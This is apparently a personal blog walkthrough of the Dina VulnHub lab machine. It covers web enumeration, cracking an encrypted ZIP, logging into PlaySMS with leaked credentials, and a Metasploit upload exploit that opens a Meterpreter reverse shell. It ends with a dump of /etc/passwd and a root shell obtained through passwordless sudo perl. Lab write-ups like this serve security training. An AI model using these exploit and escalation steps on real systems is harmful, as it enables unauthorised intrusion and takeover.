---
title: Dina 1 VulnHub Walkthrough
description: 
date: 2025-02-03
categories: [CTF, VulnHub]
tags: [vulnhub, ctf, walkthrough, dina]
permalink: /dina-1-vulnhub-walkthrough/
image:  
  path: /assets/img/thumbnails/dina.png
---

## Introduction

Dina-1.0.1 is a beginner-level vulnerable machine available on Vulnhub. The objective is to gain root access and retrieve the flag located at `/root/flag.txt`.

- **Download Link:** [Dina-1.0.1.ova](https://download.vulnhub.com/dina/Dina-1-0-1.ova)
- **File Size:** 1.1 GB
- **MD5:** 17D1FD065BD8167E8F82ECD142714284
- **SHA1:** EEEDE57F0357BBEEFCBDD8506DF9388BCB55AA0E

Setting Up the Vm. You can follow the setup guide for CyberSploit1 [here](https://neospl0it.github.io/cybersploit-1-vulnhub-walkthrough/#starting-up-the-vm)

## Identifying the Target Machine

To find the IP of the target machine, use `arp-scan`:

```bash
root@neo ~# arp-scan -l
Interface: wlan0, type: EN10MB, MAC: 50:c2:e8:xx:xx:xx, IPv4: 192.168.1.8
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.5	08:00:27:2d:e9:00	PCS Systemtechnik GmbH

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.023 seconds (126.54 hosts/sec). 1 responded
```

The target IP address is **192.168.1.5**.

## Scanning for Open Ports

We use `nmap` to find open ports and running services:

```bash
root@neo ~# nmap -A 192.168.1.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 20:41 IST
Nmap scan report for Dina.bbrouter (192.168.1.5)
Host is up (0.00051s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 5 disallowed entries
|_/ange1 /angel1 /nothing /tmp /uploads
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Dina
MAC Address: 08:00:27:2D:E9:00 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
```

### Observations:

- Port **80 (HTTP)** is open.
- The web server is **Apache 2.2.22 (Ubuntu)**.
- The `robots.txt` file contains disallowed entries:
    - `/ange1`
    - `/angel1`
    - `/nothing`
    - `/tmp`
    - `/uploads`

## Exploring the Web Application

### Accessing the Web Page

Navigating to `http://192.168.1.5/` in a browser displays the homepage.  

![Web Img](/assets/img/bposts/dina-1-walkthrough/web-img.png)  

### Checking `robots.txt`

Visiting `http://192.168.1.5/robots.txt` reveals restricted directories that may contain sensitive information:  

- `/ange1`  
- `/angel1`  
- `/nothing`  
- `/tmp`  
- `/uploads`  

While checking these directories, the `/nothing` page stood out as different from the rest.  

#### `/nothing` Page  

![Nothing](/assets/img/bposts/dina-1-walkthrough/nothing.png)  

To investigate further, I examined the source code of the `/nothing` page.  

#### Source Code Analysis  

![Source Code](/assets/img/bposts/dina-1-walkthrough/source-code.png)  

```html
<html>
<head><title>404 NOT FOUND</title></head>
<body>
<!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
-->
<h1>NOT FOUND</h1>
<h3>go back</h3>
</body>
</html>
```  
The commented section in the source code appears to contain potential passwords or hints for further enumeration.

Next steps will include checking these directories and performing further enumeration to gain access.

Here I am using `dirsearch`:

```bash
root@neo ~# dirsearch --url http://192.168.1.5/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.1.5/__25-01-30_20-40-13.txt

Target: http://192.168.1.5/

[20:40:13] Starting: 
[20:40:15] 403 -  242B  - /.ht_wsr.txt
[20:40:15] 403 -  241B  - /.htaccess.bak1
[20:40:15] 403 -  241B  - /.htaccess.orig
[20:40:15] 403 -  242B  - /.htaccess.sample
[20:40:15] 403 -  243B  - /.htaccess_extra
[20:40:15] 403 -  240B  - /.htaccess.save
[20:40:15] 403 -  242B  - /.htaccess_orig
[20:40:15] 403 -  240B  - /.htaccess_sc
[20:40:15] 403 -  240B  - /.htaccessBAK
[20:40:15] 403 -  240B  - /.htaccessOLD2
[20:40:15] 403 -  240B  - /.htaccessOLD
[20:40:15] 403 -  236B  - /.htm
[20:40:15] 403 -  236B  - /.html
[20:40:15] 403 -  245B  - /.htpasswd_test
[20:40:15] 403 -  240B  - /.htpasswds
[20:40:15] 403 -  240B  - /.httr-oauth
[20:40:38] 403 -  240B  - /cgi-bin/
[20:40:44] 403 -  236B  - /doc/
[20:40:44] 403 -  238B  - /doc/api/
[20:40:44] 403 -  244B  - /doc/html/index.html
[20:40:44] 403 -  242B  - /doc/stable.version
[20:40:44] 403 -  246B  - /doc/en/changes.html
[20:41:14] 200 -   77B  - /robots.txt
[20:41:15] 301 -  246B  - /secure  ->  http://192.168.1.5/secure/
[20:41:15] 200 -  451B  - /secure/
[20:41:15] 403 -  239B  - /server-status/
[20:41:15] 403 -  238B  - /server-status
[20:41:24] 301 -  245B  - /tmp  ->  http://192.168.1.5/tmp/
[20:41:24] 200 -  393B  - /tmp/
[20:41:26] 200 -  395B  - /uploads/
[20:41:26] 301 -  248B  - /uploads  ->  http://192.168.1.5/uploads/

Task Completed
```

During enumeration, we discovered the `/secure/` directory.  

Accessing `/secure/`  

Visiting `http://192.168.1.5/secure/` reveals a file named `backup.zip`.  

![Secure](/assets/img/bposts/dina-1-walkthrough/secure.png)  

Downloading `backup.zip`  

To download the file, we use:  

```bash
wget http://192.168.1.5/secure/backup.zip
```  

This command downloads `backup.zip` from the web server to our local system for inspection.

Extracting `backup.zip`  

Attempting to unzip the file:  

```bash
root@neo ~# unzip backup.zip
Archive:  backup.zip
   skipping: backup-cred.mp3         need PK compat. v5.1 (can do v4.6)
root@neo ~# file backup.zip 
backup.zip: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
```  

The extraction fails because the archive is encrypted with AES and requires a password.  

#### Finding the Password  

We previously discovered potential passwords in the `/nothing` page’s source code. Next, we will attempt to use those credentials to unlock the archive.  


>  Using `john` (John the Ripper)
>  
> `zip2john` can be used to extract password hashes from ZIP files.  
>  
> Step 1: Extract the Hash
> ```bash
> zip2john filename.zip > hash.txt
> ```
>  
> Step 2: Crack the Hash
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> ```
>  
> Example Output:
> ```bash
> root@neo ~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> Using default input encoding: UTF-8  
> Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])  
> Cost 1 (HMAC size) is 130 for all loaded hashes  
> Will run 8 OpenMP threads  
> Press 'q' or Ctrl-C to abort, almost any other key for status  
> freedom          (backup.zip/backup-cred.mp3)     
> 1g 0:00:00:00 DONE (2025-01-30 20:59) 5.555g/s 182044p/s 182044c/s 182044C/s 123456..eatme1  
> Use the "--show" option to display all of the cracked passwords reliably  
> Session completed.  
> ```  
{: .prompt-info }


Extracting `backup.zip`  

Using the previously discovered passwords on source code of `nothing` pass : `freedom`, we extract the archive using `7z`:  

```bash
root@neo ~# 7z x -p"freedom" backup.zip

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11  
64-bit locale=C.UTF-8 Threads:8 OPEN_MAX:1024  

Scanning the drive for archives:  
1 file, 336 bytes (1 KiB)  

Extracting archive: backup.zip  
--  
Path = backup.zip  
Type = zip  
Physical Size = 336  

Everything is Ok  

Size:       176  
Compressed: 336  
root@neo ~# ls  
backup-cred.mp3  backup.zip  
```

The extraction is successful, revealing a file named `backup-cred.mp3`.  


### Analyzing `backup-cred.mp3`  

Checking the file type:  

```bash
root@neo ~# file backup-cred.mp3  
backup-cred.mp3: ASCII text  
```  

Since it's not an actual MP3 file, we inspect its contents:  

```bash
root@neo ~# cat backup-cred.mp3  

I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid  
password: ******  

url : /SecreTSMSgatwayLogin  
```

The file contains login credentials and a URL:  

- **Username**: `touhid`  
- **Password**: `******`  
- **Login URL**: `/SecreTSMSgatwayLogin`  


### Accessing `/SecreTSMSgatwayLogin`  

Navigating to `http://192.168.1.5/SecreTSMSgatwayLogin/`, we find the login page.  

![SecreTSMSgatwayLogin](/assets/img/bposts/dina-1-walkthrough/SecreTSMSgatwayLogin.png)  

Using the username `touhid`, we attempt different passwords from the `/nothing` source code.  

After multiple attempts, the correct password is **`diana`**.  


## Exploiting PlaySMS

After spending hours searching, I couldn't find anything useful on this page. Let’s check Google for any available exploits.

Upon searching, I found some vulnerabilities, and we can leverage Metasploit to exploit them.

#### Launching Metasploit

```bash
root@neo ~# msfconsole
Metasploit tip: Use help <command> to learn more about any command
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.4.39-dev-                         ]
+ -- --=[ 2468 exploits - 1274 auxiliary - 431 post       ]
+ -- --=[ 1475 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```

#### Now, let’s search for PlaySMS exploits:

```bash
msf6 > search playsms

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/playsms_uploadcsv_exec      2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution
   1  exploit/multi/http/playsms_template_injection  2020-02-05       excellent  Yes    PlaySMS index.php Unauthenticated Template Injection Code Execution
   2  exploit/multi/http/playsms_filename_exec       2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/playsms_filename_exec

msf6 > 
```

Here Three Exploits Available

We will use the first exploit:

```bash
msf6 > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/playsms_uploadcsv_exec) > show options

Module options (exploit/multi/http/playsms_uploadcsv_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PlaySMS 1.4



View the full module info with the info, or info -d command.
```

#### Configuring the Exploit

```bash
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set RHOSTS 192.168.1.5
RHOSTS => 192.168.1.5
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set TARGETURI /SecreTSMSgatwayLogin
TARGETURI => /SecreTSMSgatwayLogin
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set USERNAME touhid
USERNAME => touhid
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set PASSWORD diana
PASSWORD => diana
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set LHOST 192.168.1.8
LHOST => 192.168.1.8
msf6 exploit(multi/http/playsms_uploadcsv_exec) > exploit
```

Obtaining a Meterpreter Session and explore the target filesystem

```bash
[*] Started reverse TCP handler on 192.168.1.8:4444 
[+] Authentication successful: touhid:diana
[*] Sending stage (40004 bytes) to 192.168.1.5
[*] Meterpreter session 1 opened (192.168.1.8:4444 -> 192.168.1.5:33711) at 2025-02-03 19:59:31 +0530
meterpreter > ls
Listing: /var/www/SecreTSMSgatwayLogin
======================================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  12489764899676  fil   205275648719-02-23 07:24:30 +0530  config-dist.php
100644/rw-r--r--  12468290063191  fil   205275671312-02-04 01:39:32 +0530  config.php
040755/rwxr-xr-x  17592186048512  dir   205275648719-02-23 07:24:30 +0530  inc
100644/rw-r--r--  13765370186885  fil   205275648719-02-23 07:24:30 +0530  index.php
100644/rw-r--r--  57823144719511  fil   205275648719-02-23 07:24:30 +0530  init.php
040755/rwxr-xr-x  17592186048512  dir   205275648855-03-31 13:52:47 +0530  lib
040755/rwxr-xr-x  17592186048512  dir   205275649399-08-27 15:45:55 +0530  plugin
040755/rwxr-xr-x  17592186048512  dir   205275649399-08-27 15:45:55 +0530  storage

meterpreter > cd /root
[-] stdapi_fs_chdir: Operation failed: 1
meterpreter > cd storage
meterpreter > ls
Listing: /var/www/SecreTSMSgatwayLogin/storage
==============================================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  0               fil   205275649399-08-27 15:45:55 +0530  index.html
040755/rwxr-xr-x  17592186048512  dir   205275649535-10-04 22:14:12 +0530  plugin

meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
040755/rwxr-xr-x  17592186048512  dir   205277557278-10-30 11:41:41 +0530  touhid

meterpreter > cd touhid
meterpreter > ls
Listing: /home/touhid
=====================

Mode              Size             Type  Last modified                      Name
----              ----             ----  -------------                      ----
100600/rw-------  6657199310350    fil   205276455396-04-06 11:19:49 +0530  .ICEauthority
100600/rw-------  210453397553     fil   205276455396-04-06 11:19:49 +0530  .Xauthority
100600/rw-------  5549097747724    fil   205277543804-09-21 19:01:38 +0530  .bash_history
100644/rw-r--r--  944892805340     fil   205266512321-07-28 13:32:37 +0530  .bash_logout
100644/rw-r--r--  14972255997342   fil   205266512321-07-28 13:32:37 +0530  .bashrc
040700/rwx------  17592186048512   dir   205276151888-08-04 04:07:59 +0530  .cache
040700/rwx------  17592186048512   dir   205275969511-10-14 20:28:19 +0530  .config
040700/rwx------  17592186048512   dir   205266564993-01-29 21:58:16 +0530  .dbus
100644/rw-r--r--  111669149722     fil   205276455396-04-06 11:19:49 +0530  .dmrc
040700/rwx------  17592186048512   dir   205276455532-05-14 17:48:06 +0530  .gconf
040700/rwx------  17592186048512   dir   205266566354-02-07 14:41:06 +0530  .gnome2
100600/rw-------  0                fil   205276419601-05-31 13:21:18 +0530  .goutputstream-00H37Y
100600/rw-------  0                fil   205277557278-10-30 11:41:41 +0530  .goutputstream-VO007Y
100664/rw-rw-r--  609885356174     fil   205276455532-05-14 17:48:06 +0530  .gtk-bookmarks
040700/rwx------  17592186048512   dir   205266565129-03-09 04:26:33 +0530  .gvfs
040755/rwxr-xr-x  17592186048512   dir   205266565129-03-09 04:26:33 +0530  .local
040700/rwx------  17592186048512   dir   205266567715-02-15 07:23:56 +0530  .mission-control
040700/rwx------  17592186048512   dir   205266913958-11-09 06:36:44 +0530  .mozilla
100644/rw-r--r--  2899102925475    fil   205266512321-07-28 13:32:37 +0530  .profile
040700/rwx------  17592186048512   dir   205276455532-05-14 17:48:06 +0530  .pulse
100600/rw-------  1099511628032    fil   205266565129-03-09 04:26:33 +0530  .pulse-cookie
040700/rwx------  17592186048512   dir   205267331383-12-25 06:21:43 +0530  .thumbnails
100600/rw-------  83502754188274   fil   205277557414-12-07 18:09:58 +0530  .xsession-errors
100600/rw-------  227027676352123  fil   205276419873-08-14 02:17:52 +0530  .xsession-errors.old
040755/rwxr-xr-x  17592186048512   dir   205266564993-01-29 21:58:16 +0530  Desktop
040755/rwxr-xr-x  17592186048512   dir   205266564993-01-29 21:58:16 +0530  Documents
040755/rwxr-xr-x  17592186048512   dir   205277552379-02-26 18:43:29 +0530  Downloads
040755/rwxr-xr-x  17592186048512   dir   205266564993-01-29 21:58:16 +0530  Music
040755/rwxr-xr-x  17592186048512   dir   205266564993-01-29 21:58:16 +0530  Pictures
040755/rwxr-xr-x  17592186048512   dir   205266564993-01-29 21:58:16 +0530  Public
040755/rwxr-xr-x  17592186048512   dir   205266564993-01-29 21:58:16 +0530  Templates
040755/rwxr-xr-x  17592186048512   dir   205266564993-01-29 21:58:16 +0530  Videos
100644/rw-r--r--  36270998823165   fil   205266512321-07-28 13:32:37 +0530  examples.desktop

meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
touhid:x:1000:1000:touhid,,,:/home/touhid:/bin/bash
mysql:x:115:125:MySQL Server,,,:/nonexistent:/bin/false
```

#### Privilege Escalation

We spawn a shell:

```bash
meterpreter > shell
Process 2865 created.
Channel 1 created.
whoami
www-data
```
Check sudo privileges:

```bash
sudo -l
Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/perl
```

Since perl has unrestricted sudo access, we exploit it:

```bash
sudo perl -e 'exec "/bin/bash";'

whoami
root
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
examples.desktop
cd /root
ls
flag.txt
cat flag.txt
________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                          |  -)))  -  ))


root password is : hello@3210
easy one .....but hard to guess.....
but i think u dont need root password......
u already have root shelll....


CONGO.........
FLAG : 22d06624cd604a0626eb5a2992a6f2e6


```